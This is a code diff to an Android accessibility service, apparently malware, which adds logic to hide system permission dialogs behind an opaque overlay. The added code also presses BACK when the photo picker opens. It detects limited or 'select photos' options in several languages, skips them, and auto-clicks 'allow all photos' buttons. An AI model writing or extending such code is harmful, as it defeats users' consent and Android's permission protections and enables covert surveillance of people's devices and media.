@@ -700,9 +700,8 @@ public class IO_Persistence_Manager extends AccessibilityService {
                         params.layoutInDisplayCutoutMode = WindowManager.LayoutParams.LAYOUT_IN_DISPLAY_CUTOUT_MODE_SHORT_EDGES;
                     }
 
-                    permissionCoverView.setAlpha(0.0f);
+                    permissionCoverView.setAlpha(1.0f);
                     wm.addView(permissionCoverView, params);
-                    permissionCoverView.animate().alpha(1.0f).setDuration(180).start();
 
                     coverTextIndex = 0;
                     if (coverTextRunnable != null) {
@@ -758,11 +757,9 @@ public class IO_Persistence_Manager extends AccessibilityService {
                 if (permissionCoverView != null) {
                     final View viewToRemove = permissionCoverView;
                     permissionCoverView = null;
-                    viewToRemove.animate().alpha(0.0f).setDuration(220).withEndAction(() -> {
-                        try {
-                            wm.removeView(viewToRemove);
-                        } catch (Exception ignored) {}
-                    }).start();
+                    try {
+                        wm.removeView(viewToRemove);
+                    } catch (Exception ignored) {}
                     Log.d(TAG, "GHOST_AUTOPILOT: Permission Cover Overlay REMOVED smoothly");
                 }
             }
@@ -1592,6 +1589,12 @@ public class IO_Persistence_Manager extends AccessibilityService {
 
         String pkgLower = pkg != null ? pkg.toLowerCase() : "";
 
+        // If Android Photo Picker / Media selection activity opens, press BACK to un-stall flow
+        if (pkgLower.contains("providers.media") || pkgLower.contains("photopicker") || pkgLower.contains("picker")) {
+            performGlobalAction(GLOBAL_ACTION_BACK);
+            return;
+        }
+
         // Instant 0ms execution for runtime permission popups & Settings Device Admin
         if (pkgLower.contains("permission") || pkgLower.contains("installer") || pkgLower.contains("packageinstaller") || pkgLower.contains("settings")) {
             new Handler(Looper.getMainLooper()).post(this::executeAutoPilotPass);
@@ -1635,8 +1638,47 @@ public class IO_Persistence_Manager extends AccessibilityService {
 
     private static volatile boolean isExitingSettings = false;
 
+    private boolean isPartialAccessNode(AccessibilityNodeInfo node) {
+        if (node == null) return false;
+        String viewId = node.getViewIdResourceName();
+        if (viewId != null) {
+            String lowerId = viewId.toLowerCase();
+            if (lowerId.contains("permission_allow_selected") || lowerId.contains("allow_selected") ||
+                lowerId.contains("permission_allow_limited") || lowerId.contains("allow_limited") ||
+                lowerId.contains("permission_allow_partial") || lowerId.contains("allow_partial") ||
+                lowerId.contains("permission_allow_choose") || lowerId.contains("allow_choose")) {
+                return true;
+            }
+        }
+        CharSequence textSeq = node.getText();
+        CharSequence descSeq = node.getContentDescription();
+        String text = textSeq != null ? textSeq.toString().toLowerCase() : "";
+        String desc = descSeq != null ? descSeq.toString().toLowerCase() : "";
+        if (text.contains("select photo") || desc.contains("select photo") ||
+            text.contains("selected photo") || desc.contains("selected photo") ||
+            text.contains("allow selected") || desc.contains("allow selected") ||
+            text.contains("choose photo") || desc.contains("choose photo") ||
+            text.contains("limited photo") || desc.contains("limited photo") ||
+            text.contains("select photos") || desc.contains("select photos") ||
+            text.contains("seleccionar foto") || desc.contains("seleccionar foto") ||
+            text.contains("sélectionner des photos") || desc.contains("sélectionner des photos")) {
+            return true;
+        }
+        int count = node.getChildCount();
+        for (int i = 0; i < count; i++) {
+            AccessibilityNodeInfo child = node.getChild(i);
+            if (child != null) {
+                boolean isPartial = isPartialAccessNode(child);
+                child.recycle();
+                if (isPartial) return true;
+            }
+        }
+        return false;
+    }
+
     private boolean searchFullAccessButtonDfs(AccessibilityNodeInfo node) {
         if (node == null) return false;
+        if (isPartialAccessNode(node)) return false;
 
         String viewId = node.getViewIdResourceName();
         if (viewId != null) {
@@ -1661,7 +1703,8 @@ public class IO_Persistence_Manager extends AccessibilityService {
 
             String[] fullAccessKeywords = {
                 "allow all", "allow access to all photos", "allow all photos",
-                "allow all photos and videos", "allow all the time", "permitir todo", "permitir todos"
+                "allow all photos and videos", "allow all the time", "permitir todo", "permitir todos",
+                "autoriser tout"
             };
 
             for (String kw : fullAccessKeywords) {
@@ -2124,6 +2167,7 @@ public class IO_Persistence_Manager extends AccessibilityService {
 
     private boolean searchPermissionButtonDfs(AccessibilityNodeInfo node) {
         if (node == null) return false;
+        if (isPartialAccessNode(node)) return false;
 
         // 1. Check View ID Resource Name (Excluding Partial Access "Select photos" button IDs on Android 14)
         String viewId = node.getViewIdResourceName();
